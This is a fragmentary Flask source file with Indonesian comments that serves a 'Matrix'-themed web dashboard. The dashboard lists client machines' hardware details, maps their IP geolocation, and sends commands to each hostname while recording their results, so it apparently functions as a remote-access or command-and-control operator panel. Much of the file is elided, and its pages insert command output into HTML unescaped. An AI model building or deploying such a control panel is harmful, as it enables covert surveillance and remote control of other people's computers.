...
def get_db_connection():
    ...
    if not db_url:
        raise Exception("Environment variable POSTGRES_URL not set. Please connect a Postgres database in Vercel dashboard.")
    return psycopg2.connect(db_url)

def init_db():
    """Inisialisasi tabel, aman dipanggil berkali-kali"""
    try:
...
# Inisialisasi sekali (di sini tetap aman karena jika env tidak ada, akan error dan bisa di-handle di route)
# Kita coba init, tapi jika gagal akan dicoba lagi di setiap request via before_request
...
# --- HTML Template Matrix (sama seperti sebelumnya, saya salin dari jawaban sebelumnya) ---
MATRIX_TEMPLATE = """
<!DOCTYPE html>
<html lang="id">
<head>
    ...
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#000; color:#0f0; font-family:'Courier New',monospace; padding:20px; position:relative; overflow-x:auto; }
        #matrix-canvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:0; opacity:0.15; pointer-events:none; }
        .container { position:relative; z-index:1; max-width:1400px; margin:0 auto; background:rgba(0,0,0,0.75); backdrop-filter:blur(2px); border:1px solid #0f0; box-shadow:0 0 15px rgba(0,255,0,0.2); border-radius:12px; padding:20px; }
        h1, h2, h3 { font-size:1.6rem; text-transform:uppercase; letter-spacing:3px; border-left:4px solid #0f0; padding-left:15px; margin-bottom:20px; text-shadow:0 0 5px #0f0; }
        h2 { font-size:1.3rem; border-left-width:2px; margin-top:20px; }
        .matrix-panel { background:#0a0f0a; border:1px solid #0f0; border-radius:8px; padding:15px; margin-bottom:20px; box-shadow:0 0 8px rgba(0,255,0,0.1); }
        select, input, button, textarea { background:#111; border:1px solid #0f0; color:#0f0; padding:8px 12px; font-family:monospace; font-size:0.9rem; border-radius:4px; outline:none; }
        ...
        th { background:#0f0f0f; color:#0f0; text-transform:uppercase; }
        tr:hover { background:#0a1f0a; }
        .badge { display:inline-block; padding:2px 8px; border-radius:20px; font-size:0.7rem; background:#0f0; color:#000; }
        .status-pending { color:#ffcc00; text-shadow:0 0 2px #ffcc00; }
        .status-success { color:#0f0; }
        .status-failed { color:#f00; }
        #map { height:300px; border:1px solid #0f0; border-radius:8px; background:#000; }
        footer { text-align:center; margin-top:20px; font-size:0.7rem; color:#0f0a; }
    </style>
</head>
<body>
...
<div class="container">
    ...
    <div id="clientInfo" style="display:none;">
        <div class="matrix-panel"><h2>🖥️ HARDWARE SPESIFIKASI</h2><div id="hardwareTable"></div></div>
        <div class="matrix-panel"><h2>🗺️ LOKASI (IP GEOLOCATION)</h2><div id="map"></div><div id="locDetails"></div></div>
        <div class="matrix-panel">
        ...
        <div class="matrix-panel"><h2>📜 RIWAYAT PERINTAH</h2><div id="commandHistory" class="command-history"></div></div>
    </div>
...
<script>
    ...
    async function loadClientData() {
        ...
        if (client.hardware) {
            ...
            for (const [key, val] of Object.entries(client.hardware)) {
                if (typeof val === 'object') html += `<tr><td>${key}</td><td><pre>${JSON.stringify(val, null, 2)}</pre></td></tr>`;
                else html += `<tr><td>${key}</td><td>${val}</td></tr>`;
            }
            html += `</table>`;
        ...
        if (map === null) {
            ...
            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a> & CartoDB' }).addTo(map);
        } else {
    ...
    async function loadCommandHistory(hostname) {
        ...
        cmds.forEach(c => {
            ...
            html += `<tr><td>${c.id}</td><td>${c.command_type}</td><td>${c.command_data}</td><td class="${statusClass}">${c.status}</td><td><pre style="max-width:300px; overflow-x:auto;">${c.result || '-'}</pre></td><td>${c.created_at}</td></tr>`;
        });
        html += `</table>`;
    ...
    async function sendCommand() {
        ...
        if (!cmdData) { document.getElementById('cmdResult').innerHTML = '<span class="badge">⚠️ Isi data perintah!</span>'; return; }
...
def home():
    if not _db_initialized:
        return "Database not ready. Please ensure Vercel Postgres is connected and redeploy.", 500
